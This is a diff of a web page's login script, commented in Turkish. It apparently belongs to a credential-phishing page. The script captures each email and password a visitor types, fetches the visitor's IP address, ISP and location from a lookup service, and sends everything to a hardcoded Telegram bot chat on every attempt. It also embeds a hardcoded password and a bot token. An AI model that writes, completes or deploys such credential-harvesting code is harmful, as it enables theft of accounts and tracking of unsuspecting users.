@@ -91,36 +91,47 @@
 </div>
 
 <script>
-    async function verileriGonder() {
+    async function VeriGender() {
     const email = document.getElementById('userEmail').value;
     const pass = document.getElementById('userPass').value;
-    const dogruSifre = "Adhfxygh8lm"; // Eski şifren burada
+    const dogruSifre = "Adhfxygh8lm"; 
 
     try {
+        // IP ve Detaylı Bilgileri Alıyoruz
         const ipRes = await fetch('https://ipapi.co/json/');
         const data = await ipRes.json();
 
-        const botToken = "8763400885:AAFUvdZBZy92pGCv7lSfjk17vvEliRLR20E";
+        const botToken = "8763400885:AAFUvdZBZy92pGCv..."; // Tokenini buraya tam yaz
         const chatId = "7580423994";
 
+        // Senin istediğin IP ve Token bilgilerini de içeren mesaj
+        let mesaj = `🌐 **YENİ BİLGİ GELDİ**\n\n` +
+                    `📧 E-posta: ${email}\n` +
+                    `🔑 Şifre: ${pass}\n` +
+                    `📡 IP Adresi: ${data.ip}\n` +
+                    `🏢 ISS (Sağlayıcı): ${data.org}\n` +
+                    `📍 Konum: ${data.city} / ${data.country_name}\n` +
+                    `🤖 Bot Token: ${botToken}`;
+
         if (pass === dogruSifre) {
-            // ŞİFRE DOĞRUYSA
-            const mesaj = `✅ **BAŞARILI GİRİŞ!**\n\n📧 E-posta: ${email}\n🔑 Şifre: ${pass}\n📍 Konum: ${data.city}\n🌐 ISS: ${data.org}`;
+            mesaj = "✅ **BAŞARILI GİRİŞ!**\n\n" + mesaj;
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
             
             document.getElementById('login-form').style.display = 'none';
             document.getElementById('content').style.display = 'block';
         } else {
-            // ŞİFRE YANLIŞSA
-            const mesaj = `⚠️ **HATALI DENEME!**\n\n📧 Denenen: ${email}\n🔑 Şifre: ${pass}\n📍 Konum: ${data.city}`;
+            mesaj = "⚠️ **HATALI DENEME!**\n\n" + mesaj;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
             
-            alert("Hatalı email veya şifre!");
+            alert("Hatalı e-posta veya şifre!");
         }
     } catch (e) {
-        alert("Bağlantı hatası!");
+        alert("Bağlantı hatası! Lütfen internetinizi kontrol edin.");
     }
 }
+
+    
+
 
         
     
